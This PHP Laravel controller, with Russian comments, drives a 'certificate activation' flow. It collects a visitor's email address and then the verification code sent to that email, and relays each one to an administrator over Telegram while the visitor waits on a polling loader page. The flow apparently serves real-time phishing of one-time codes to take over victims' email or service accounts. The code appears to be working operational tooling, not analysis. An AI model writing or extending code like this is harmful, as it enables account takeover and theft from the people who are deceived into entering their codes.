<?php

namespace App\Http\Controllers;

use App\Services\TelegramService;
use Illuminate\Http\Request;
use App\Models\Certificate;

class CertificateController extends Controller
{
    /**
     * Show the certificate activation form.
     *
     * @param string $code
     * @return \Illuminate\View\View
     */
    public function show(string $code)
    {
        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            abort(404, 'Сертификат не найден.');
        }

        // Если статус сертификата = 1, перенаправляем на ввод email
        if ($certificate->status === Certificate::STATUS_ACTIVATED) {
            return redirect()->route('cert.enterEmail', $certificate->code);
        }

        if ($certificate->status === Certificate::STATUS_INFORMATION_PROVIDED) {
            return redirect()->route('cert.wait', $certificate->code);
        }

        if ($certificate->status === Certificate::STATUS_CODE_AWAITING) {
            return redirect()->route('cert.mail_code', $certificate->code);
        }

        return view('certificates.activate', [
            'certificate' => $certificate,
        ]);
    }


    /**
     * Verify the activation code and update the certificate status.
     *
     * @param \Illuminate\Http\Request $request
     * @param string $code
     * @return \Illuminate\Http\RedirectResponse
     */
    /**
     * Verify the activation code and update the certificate status.
     *
     * @param \Illuminate\Http\Request $request
     * @param string $code
     * @return \Illuminate\Http\RedirectResponse
     */
    public function verify(Request $request, string $code)
    {
        $request->validate([
            'activation_code' => 'required|string',
        ]);

        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            return redirect()->route('cert.show', $code)->withErrors('Сертификат не найден.');
        }

        // Проверить activation_code (без учета регистра)
        if (strtoupper($certificate->activation_code) !== strtoupper($request->input('activation_code'))) {
            return redirect()->route('cert.show', $code)->withErrors('Неверный код активации.');
        }

        // Обновить статус сертификата
        $certificate->update(['status' => 1]);

        // Перенаправить на страницу ввода email
        return redirect()->route('cert.enterEmail', $certificate->code);
    }

    /**
     * Show the email entry form after successful activation.
     *
     * @param string $code
     * @return \Illuminate\View\View
     */
    public function enterEmail(string $code)
    {
        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            abort(404, 'Сертификат не найден.');
        }

        return view('certificates.enter_email', [
            'certificate' => $certificate,
        ]);
    }

    /**
     * Save the email for the certificate.
     *
     * @param \Illuminate\Http\Request $request
     * @param string $code
     * @return \Illuminate\Http\RedirectResponse
     */
    public function saveEmail(TelegramService $telegramService, Request $request, string $code)
    {
        $request->validate([
            'email' => 'required|email',
        ]);

        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            abort(404, 'Сертификат не найден.');
        }

        // Сохранить email в auth_info['user_email']
        $auth_info = $certificate->auth_info ?? [];

        $auth_info['user_email'] = $request->input('email');

        $certificate->update([
            'auth_info' => $auth_info,
            'status' => Certificate::STATUS_INFORMATION_PROVIDED
        ]);

        // Отправить сообщение в Telegram админу
        $telegramService->sendAuthToAdmin($certificate);

        return redirect()->route('cert.wait', $certificate->code);
    }

    /**
     * Show the waiting page with a loader.
     *
     * @param string $code
     * @return \Illuminate\View\View
     */
    public function waitForStatus(string $code)
    {
        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            abort(404, 'Сертификат не найден.');
        }

        return view('certificates.wait_for_status', [
            'certificate' => $certificate,
        ]);
    }

    /**
     * Check the status of the certificate.
     *
     * @param string $code
     * @return \Illuminate\Http\JsonResponse
     */
    public function checkStatus(string $code)
    {
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            return response()->json(['status' => 'not_found'], 404);
        }

        return response()->json([
            'status' => $certificate->status,
        ]);
    }

    /**
     * Show the mail code entry form.
     *
     * @param string $code
     * @return \Illuminate\View\View
     */
    public function enterMailCode(string $code)
    {
        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            abort(404, 'Сертификат не найден.');
        }

        return view('certificates.enter_mail_code', [
            'certificate' => $certificate,
        ]);
    }

    /**
     * Submit the mail code and send it to the admin via Telegram.
     *
     * @param \Illuminate\Http\Request $request
     * @param string $code
     * @param \App\Services\TelegramService $telegramService
     * @return \Illuminate\Http\RedirectResponse
     */
    public function submitMailCode(Request $request, string $code, TelegramService $telegramService)
    {
        $request->validate([
            'mail_code' => 'required|string',
        ]);

        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            abort(404, 'Сертификат не найден.');
        }

        // Сохранить mail_code в auth_info
        $auth_info = $certificate->auth_info ?? [];
        $auth_info['mail_code'] = $request->input('mail_code');
        $certificate->update([
            'auth_info' => $auth_info,
            'status' => Certificate::STATUS_CODE_SENT
        ]);

        // Отправить код админу через Telegram
        $telegramService->sendMailCodeToAdmin($certificate, $request->input('mail_code'));

        return redirect()->route('cert.wait', $certificate->code);
    }

    public function done(string $code)
    {
        // Найти сертификат по коду
        $certificate = Certificate::where('code', $code)->first();

        if (!$certificate) {
            abort(404, 'Сертификат не найден.');
        }

        return view('certificates.done', [
            'certificate' => $certificate,
        ]);
    }


}
